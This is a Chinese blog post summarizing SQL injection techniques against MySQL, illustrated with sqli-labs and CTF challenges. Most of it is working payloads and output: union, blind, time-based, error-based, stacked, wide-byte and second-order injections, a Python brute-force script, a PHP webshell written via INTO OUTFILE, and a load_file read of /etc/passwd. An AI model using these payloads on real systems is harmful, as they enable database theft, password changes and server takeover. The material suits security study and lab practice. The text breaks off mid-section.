    <id>https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-22T13:23:47.000Z</published>
    <updated>2022-11-22T13:26:29.798Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于这个漏洞，非常经典，但是考点又及其多，之前一直学的模模糊糊，遇到困难的地方就难以下手，故这里总结一下思路，参考了很多大佬的文章，十分感谢</p><h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。<br>可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等<br>注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。<br>注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog</p><h1 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h1><p> information_schema包含了大量有用的信息，例如下图 :<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png" alt="zawirg523g.png"><br>常用语句:</p><pre><code class="python">#sql当前用户：select user()数据库版本：select version() , select @@version数据库名：select database()操作系统：select @@version_compile_os所有变量：show variables单个变量：select @@secure_file_priv , show variables like &#39;secure_file_%&#39;爆字段数：order by 1... ，group by 1...查库名：select group_concat(schema_name) from information_schema.schemata查表名：select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;查字段：select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;读取某行：select * from mysql.user limit n,m // limit m offset n （第n行之后m行，第一行为0）# mysql.user下有所有的用户信息，其中authentication_string为用户密码的hash，如果可以使用可以修改这个值，那么就可以修改任意用户的密码读文件：select load_file(&#39;/etc/passwd&#39;)写文件：select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;/var/www/html/a.php&#39;  //该处文件名无法使用16进制绕过</code></pre><h1 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h1><h2 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h2><pre><code class="python">order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/</code></pre><h2 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h2><pre><code class="python"># 在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中select null,null,schema_name from information_schema.schemata</code></pre><h2 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h2><pre><code class="python">select null,null,...,database()</code></pre><h2 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h2><pre><code class="python">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()# 或select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1</code></pre><h2 id="获取表中字段"><a href="#获取表中字段" class="headerlink" title="获取表中字段"></a>获取表中字段</h2><p> 这里假设已经获取到表名为user  </p><pre><code class="python">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></pre><h2 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h2><p> 这里假设已经获取到表名为user，且字段为username和password  </p><pre><code class="python">select null,group_concat(username,password) from users</code></pre><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>正常查询语句如下:</p><pre><code class="python">mysql_query(&quot;select username from users where id=&#39;$_GET[&#39;id&#39;]&#39; &quot;);</code></pre><p>我们可以构造万能密码:</p><pre><code class="python">&#39; or &#39;1&#39;=&#39;1　　　　　　　　//完整语句 select username where id=&#39;&#39; or &#39;1&#39;=&#39;1&#39;&#39; or 1=1#　　　　　　　　　//完整语句 select username where id=&#39;&#39; or 1=1#&#39;&#39;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#39;&#39;=0#</code></pre><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><pre><code class="python">xx&#39; union select 1,(select database())#</code></pre><pre><code class="python">mysql&gt; select * from users where id=-1 union select 1,user(),3;+----+----------------+----------+| id | username       | password |+----+----------------+----------+|  1 | root@localhost | 3        |+----+----------------+----------+1 row in set (0.00 sec)</code></pre><h1 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h1><p>substr(str,start,long)<br>str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度<br>if(exp1,exp2,exp3)<br>如果满足exp1,那么执行exp2,否则执行exp3<br>payload:</p><pre><code class="python">xx&#39; or if((substr((select database()),1,1)=&#39;c&#39;),1,0) #　　　　//判断数据库第一个字符是否为cxx&#39; or if((substr((select database()),2,1)=&#39;t&#39;),1,0) #　</code></pre><p>假设 , (逗号)被过滤了，可以用如下方式处理<br>if(exp1, exp2, exp3) =&gt; case when exp1 then exp2 else exp3 end<br>substr(exp1, 1, 1) =&gt; substr(exp1) from 1 for 1</p><pre><code class="python">xx&#39; or case when (substr((select database()) from 1 for 1)=&#39;c&#39;) then 1 else 0 end #</code></pre><p> 假设substr被过滤了，可以用如下方式处理<br>LOCATE(substr,str,pos)<br>返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0<br>ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个binary即可</p><pre><code class="python">xx&#39; or if((locate(binary&#39;c&#39;,(select database()),1)=1),1,0) #xx&#39; or if((locate(binary&#39;t&#39;,(select database()),1)=2),1,0) #</code></pre><h1 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h1><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功<br>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显<br>还是利用if来判断结果正确与否，只是返回值用延时来代替1<br>方法：sleep，benchmark， 笛卡尔积等</p><pre><code class="python">#基于sleep的延迟 xx&#39; or if(length((select database()))&gt;1,sleep(5),1) #基于笛卡尔乘积运算时间造成的时间延迟xx&#39; or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # 基于benchmark的延迟 xx&#39;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#39;a&#39;))),1) #--大概会用2S时间</code></pre><pre><code class="python"># sleepmysql&gt; select * from users where id =-1 or if(length((select database()))&gt;1,sleep(2),1);Empty set (4.02 sec)# benchmarkmysql&gt; select * from users where id =-1 or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#39;a&#39;))),1);Empty set (1.40 sec)</code></pre><p> benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟  </p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容<br>报错注入函数很多<br><strong>1 floor()和rand()</strong></p><pre><code class="python">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666847945122-532e8885-7278-4e3b-bcc4-7b8a42604734.png" alt="image.png"><br><strong>2 extractvalue()</strong><br>updatexml一样，限制长度也是32位。</p><pre><code class="python">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848282869-431f2e16-eef4-4a40-9352-585db732a0bc.png" alt="image.png"><br><strong>3 updatexml()</strong><br>updatexml（）这个函数最多只能爆32位字符，如果要爆的数据超过了这个位数，可以加上使用limit 0,1来查询后面数据。</p><pre><code class="python">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848345412-c1787edd-3a00-482d-9f01-4c4d0ab5a9ed.png" alt="image.png"><br><strong>4 geometrycollection()</strong></p><pre><code class="python">id=1 and geometrycollection((select * from(select * from(select user())a)b))</code></pre><p> 5.5&lt;mysql版本&lt;5.6<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666850740062-904d57c0-5523-4e67-ae20-f2e41a68db31.png" alt="image.png"><br>后面几个用法一模一样，不再示范！<br><strong>5 multipoint()</strong></p><pre><code class="python">id=1 and multipoint((select * from(select * from(select user())a)b))</code></pre><p><strong>6 polygon()</strong></p><pre><code class="python">id=1 and polygon((select * from(select * from(select user())a)b))</code></pre><p><strong>7 multipolygon()</strong></p><pre><code class="python">id=1 and multipolygon((select * from(select * from(select user())a)b))</code></pre><p><strong>8 linestring()</strong></p><pre><code class="python">id=1 and linestring((select * from(select * from(select user())a)b))</code></pre><p><strong>9 multilinestring()</strong></p><pre><code class="python">id=1 and multilinestring((select * from(select * from(select user())a)b))</code></pre><p><strong>10 exp()</strong></p><pre><code class="python">id=1 and exp(~(select * from(select user())a))</code></pre><h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p><pre><code class="python">mysql&gt; select * from users where id=1;select * from users where id =2;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | Dumb     | Dumb     |+----+----------+----------+1 row in set (0.00 sec)+----+----------+------------+| id | username | password   |+----+----------+------------+|  2 | Angelina | I-kill-you |+----+----------+------------+1 row in set (0.00 sec)</code></pre><p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p><pre><code class="python">    目标存在sql注入漏洞    目标未对&quot;;&quot;号进行过滤    目标中间层查询数据库信息时可同时执行多条sql语句</code></pre><p><strong>实例:sqllibs Less-38:</strong><br> 经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666852427968-8100d5b0-a8ec-4eed-af6a-239de5fe82f4.png" alt="image.png"><br>我们来修改下这个用户的密码试试:</p><pre><code class="python">http://127.0.0.1/sqli-labs/Less-38/?id=-1&#39;union select 1,username,password from users limit 1,1;update users set password=666 where id=2;--+</code></pre><p>我们再来查询下,密码已经被改了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666853455525-43a9bc6f-fc2d-4d15-963b-9514495b4c38.png" alt="image.png"><br>如果select被过滤。可以搭配desc来读取表的字段<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png" alt="image.png"></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>利用条件:</p><ul><li>[查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数</li><li>数据库的编码为GBK</li></ul><p>payload:</p><pre><code class="python">id = -1%df&#39; union select 1,user(),3,%23</code></pre><p>当我们输入payload时，会在我们输入的单引号前加一个转义字符,就成了这样:</p><pre><code class="python">id = -1%df\&#39; union select 1,user(),3,%23</code></pre><p> 在 其中\的十六进制是%5c ,所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。<br> 用sqli-labs靶场进行演示，这里利用32关进行练习<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854808597-8d091260-842e-4241-9924-e5c711538ba7.png" alt="image.png"><br>加单引号没有反应，加上%df<br>成功报错<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png" alt="image.png"><br>后面的就正常查询即可，这里不再演示</p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886911068-75bca2f0-2664-47d0-8622-ca7ce86bd20a.png" alt="40cf06a986854c5eb85bd683f9b15553.png"><br>例题:<strong>sql-labs 24</strong><br>我们直接看源码，这是修改密码的部分:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887830878-82b43c68-1c06-44e3-8527-7185c46dafc7.png" alt="image.png"><br>如果我们输入的username变为:</p><pre><code class="python">admin&#39;#那么sql语句就被截断为:UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39;#</code></pre><p>这样就不再需要旧密码，我们来操作一下<br>注册一个账号:</p><pre><code class="python">账号: admin&#39;#密码: 123456</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887956324-7b8db159-4370-4530-a6bb-fcdb075d4f8a.png" alt="image.png"><br>我们看下数据库:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888075339-a126f007-62a2-48df-a1a3-311008fe29a5.png" alt="image.png"><br>已经增加了用户进去,我们来修改下密码<br>旧密码就随便填一个了，然后输入我们的新密码 HY666<br>我们再看数据库，惊奇的发现admin的密码已经被改了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png" alt="image.png"></p><h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><p>异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假(0)，两个条件不同即为真(1)，null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。<br>mysql里异或运算符为^ 或者 xor<br><strong>两个同为真的条件做异或，结果为假</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884915483-ee8995c5-e81d-4566-85a2-29b17d2672c2.png" alt="image.png"><br>** 两个同为假的条件做异或,结果为假**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884955054-9f7afafe-2778-4c4a-9a7e-cfbb4efb5493.png" alt="image.png"><br>** 一个条件为真,一个条件为假,结果为真**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666885000745-7876f94e-b036-431a-bb0d-6de2e2ce01fd.png" alt="image.png"><br>** null与任何条件（真、假、null）做异或,结果都为null **<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886143153-c8e79dff-78c0-493c-921f-5f1c6bd989f5.png" alt="image.png"></p><p>^和xor是有区别的<br>** ^运算符会做位异或运算 如1^2=3  **</p><pre><code class="python">mysql&gt; select 1^2;+-----+| 1^2 |+-----+|   3 |+-----+1 row in set (0.00 sec)mysql&gt; select 1^1;+-----+| 1^1 |+-----+|   0 |+-----+1 row in set (0.00 sec)</code></pre><p>** xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据  **<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png" alt="image.png"></p><h1 id="使用handler进行注入"><a href="#使用handler进行注入" class="headerlink" title="使用handler进行注入"></a>使用handler进行注入</h1><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。<br>句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）</p><pre><code class="python"># 打开一个表名为 tbl_name 的表的句柄HANDLER tbl_name OPEN [ [AS] alias]# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]# 2、通过索引查看表# FIRST: 获取第一行（索引最小的一行）# NEXT: 获取下一行# PREV: 获取上一行# LAST: 获取最后一行（索引最大的一行）HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]# 3、不通过索引查看表# READ FIRST: 获取句柄的第一行# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]# 关闭已打开的句柄HANDLER tbl_name CLOSE</code></pre><pre><code class="python">例如,现在已知一张表名为tablename：handler tablename open;handler tablename read frist;handler tablename close;</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144238458-a8b92e12-e096-4685-8d1a-fbfb342ecfd9.png" alt="image.png"><br><strong>[强网杯 2019]随便注</strong><br>查表:<br>经过测试，存在堆叠注入</p><pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;show%20tables;%23</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144813840-a3748f88-d8cc-4a7d-8bb9-8f22c950fa46.png" alt="image.png"><br>进一步测试，发现select被过滤<br>使用desc查一些表:</p><pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;desc%20`1919810931114514`;%23</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667145622072-dd4f5f40-8a91-4018-aab5-e8e5ad92c79d.png" alt="image.png"><br>后面就使用handler读数据:<br>最终payload:</p><pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;%23</code></pre><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><h2 id="当information-schema库被禁用"><a href="#当information-schema库被禁用" class="headerlink" title="当information_schema库被禁用"></a>当information_schema库被禁用</h2><p> 在手工SQL注入时，我们常常会想着利用 information_schema库 来进行爆数据库名、表名、字段名，但如果 information_schema库 被禁用了怎么办？<br><strong>1. sys数据库</strong><br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名.<br>** 对表自增ID的监控  :**</p><ul><li>sys.schema_auto_increment_columns</li></ul><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890730344-29689eec-51d0-4a01-a34f-6e11ef26aa51.png" alt="image.png"><br>我们可以利用这个表来读取表名:</p><pre><code class="python">mysql&gt; select table_name from sys.schema_auto_increment_columns;+--------------------------------+| table_name                     |+--------------------------------+| zzcms_looked_dls               || zzcms_ask                      || zzcms_usersetting              || message                        || zzcms_pinglun                  |...</code></pre><p> 但是 sys.schema_auto_increment_columns这个库有些局限性，一般要超级管理员才可以访问sys。<br>**查询表的统计信息，其中还包括Innodb缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间）降序排序  **</p><ul><li>sys.schema_table_statistics_with_buffer</li><li>sys.x$schema_table_statistics_with_buffer</li><li>…</li></ul><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890163777-95ae65ae-63a4-4104-8518-1d5d0535fbb4.png" alt="image.png"></p><pre><code class="python">mysql&gt; select table_name from sys.schema_table_statistics_with_buffer;+--------------------------------+| table_name                     |+--------------------------------+| users                          || sys_config                     || pwmm2nzea4                     || httpinfo                       || member                         || message                        || users                          |...</code></pre><pre><code class="python">mysql&gt; select table_name from sys.x$schema_table_statistics_with_buffer;+--------------------------------+| table_name                     |+--------------------------------+| users                          || httpinfo                       || zzcms_askclass                 || zzcms_msg                      || zzcms_wangkan                  || emails                         || zzcms_help                     |</code></pre><p><strong>2.InnoDb引擎</strong><br> 从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>mysql.innodb_index_stats、mysql.innodb_table_index同样存放有库名表名  </p><ul><li>mysql.innodb_table_stats</li></ul><pre><code class="python">mysql&gt; select table_name from mysql.innodb_table_stats;+---------------+| table_name    |+---------------+| gtid_executed || sys_config    |+---------------+2 rows in set (0.00 sec)</code></pre><ul><li>mysql.innodb_index_stats</li></ul><pre><code class="python">mysql&gt; select table_name from mysql.innodb_index_stats;+---------------+| table_name    |+---------------+| gtid_executed || gtid_executed || gtid_executed || gtid_executed || sys_config    || sys_config    || sys_config    |+---------------+7 rows in set (0.00 sec)</code></pre><p>不过这些表里内容并不是很全<br>不过我们通过以上这些库也仅仅可以知道它们的表名而已，那么我们如何注出它们的字段名呢，这里我们就要引入无列名注入。</p><h2 id="取别名绕过列名查数据"><a href="#取别名绕过列名查数据" class="headerlink" title="取别名绕过列名查数据"></a>取别名绕过列名查数据</h2><p><strong>正常查询</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891654963-b1a46076-d425-4adf-a936-4c504710b299.png" alt="image.png"><br><strong>将列名转换为任何可选的已知值</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891730209-6b409134-24a2-4448-a6a6-4547db7ff4e1.png" alt="image.png"><br>此时我们发现列名变为1,2,3 受我们所控制<br><strong>代替列名读取数据</strong><br> 像这样就可以查询第二列的数据，在虚拟表中，列名都是1，2，3，所以我们在查询语句中要用 <code>2</code> 而不能直接用 2<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892282277-87b5d646-8151-4ee0-99ab-304d0539cfc8.png" alt="image.png"><br>取别名也可以直接在后面加<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892342943-2ff0edce-b1c5-4738-8878-a261926c6451.png" alt="image.png"><br><strong>注入payload</strong></p><pre><code class="python">-1&#39;union select 1,(select group_concat(b) from(select 1 as a,2 as b,3 as c union select * from users)as m),3#</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892865758-a850da85-0687-4866-83d7-0d2dc8b3e96f.png" alt="image.png"></p><h2 id="利用join爆列名"><a href="#利用join爆列名" class="headerlink" title="利用join爆列名"></a>利用join爆列名</h2><p>需要有回显才能使用<br>由于join是将两张表的列名给加起来，所以有可能会产生相同的列名，而在使用别名时，是不允出现相同的列名的，因此当它们两个一起使用时，就会爆出相同的列名的名称，从而获得列名<br><strong>正常查询</strong></p><pre><code class="python">mysql&gt; select * from users where id=-1;Empty set (0.00 sec)</code></pre><p><strong>使用join连接爆出相同列名的名称</strong></p><pre><code class="python">mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b) as c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</code></pre><p><strong>爆出剩余的列名名称</strong></p><pre><code class="python">mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b using(id)) as c;ERROR 1060 (42S21): Duplicate column name &#39;username&#39;---------------------mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b using(id,username)) as c;ERROR 1060 (42S21): Duplicate column name &#39;password&#39;</code></pre><p>这样所有字段全部都暴出来了<br><strong>注入payload</strong></p><pre><code class="python"># 获取第一个列名-1&#39; union all select * from (select * from users as a join users as b)as c## 获取下一个列名-1&#39; union all select*from (select * from users as a join users as b using(username))as c#</code></pre><h2 id="字符比较查询"><a href="#字符比较查询" class="headerlink" title="字符比较查询"></a>字符比较查询</h2><p>要知道比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0  </p><pre><code class="python">mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;a&#39;);+---------------------------+| (select &#39;f&#39;)&gt;(select &#39;a&#39;) |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;g&#39;);+---------------------------+| (select &#39;f&#39;)&gt;(select &#39;g&#39;) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;agggggg&#39;);+---------------------------------+| (select &#39;f&#39;)&gt;(select &#39;agggggg&#39;) |+---------------------------------+|                               1 |+---------------------------------+1 row in set (0.00 sec)</code></pre><p>因为在<strong>相等</strong>时返回<strong>0</strong>，所以在进行爆破时，我们爆破出来的<strong>1</strong>的时候，是比正确字符要<strong>大1</strong>的，所以在编写脚本时，我们要**-1<strong>才能得到正确字符。<br>所以我们在设置循环上限时ascii值要大于或者等于</strong>127**<br>脚本如下：([GYCTF2020]Ezsqli)</p><pre><code class="python">import requestsurl=&#39;http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/&#39;flag=&#39;&#39;for i in range(1,50):    for j in range(32,128):        hexchar=flag+chr(j)        # f1ag_1s_h3r3_hhhhh这个表应该只有一个数据，所以id为1，我们用select 1,xx就可以进行第二个字段的比较了        # 这个payload的意思就是f1ag_1s_h3r3_hhhhh第二个字段的数据每一个字符与这个字符串每隔一个字符一一比较大小，如果这个字符比较大，就返回True。以此类推，不断增加字符串长度，就可以得到完整的数据。        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;.format(hexchar)        #print(payload)        data=&#123;&#39;id&#39;:payload&#125;        re=requests.post(url=url,data=data)        if &#39;Nu1L&#39; in re.text:            flag+=chr(j-1)            print(flag)            break</code></pre><h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p> 盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注 </p><pre><code class="python">1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。2.盲注是不能通过直接显示的途径来获取数据库数据的方法。在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类,布尔盲注、延时盲注、报错盲注）</code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>原理：</strong>盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False<br>注入流程:</p><pre><code class="python">流程：求当前数据库的长度以及ASCII求当前数据库表的ASCII求当前数据库表中的个数求当前数据库表中其中一个表的表名长度求当前数据库中其中一个表的表名的ASCII求列名的数量求列名的长度求列名的ascii求字段的数量求字段内容的长度求字段内容的ascii</code></pre><p>以sql-labs第八关为例:<br>我们来简单测试下:</p><pre><code class="python">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;and length(database())=1--+</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943591164-d1756076-d55c-403c-947a-58fddd9293d4.png" alt="image.png"><br>当我们输入这样的语句，界面并没有反应，我们慢慢增加长度，到8时出现变化了:</p><pre><code class="python">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;and length(database())=8--+</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943606968-cf2ad664-42ad-403c-8744-b5eca01d7399.png" alt="image.png"><br>这就说明盲注成功了！<br>剩下的就是结合一些函数提取出对应的字符进行判断即可</p><pre><code class="python">这里以sqlabs靶场为例通过length函数 判断数据库长度和数据表字段信息数量。通过substr、ascii函数 判断数据库名、表名、字段值等。求数据库的长度       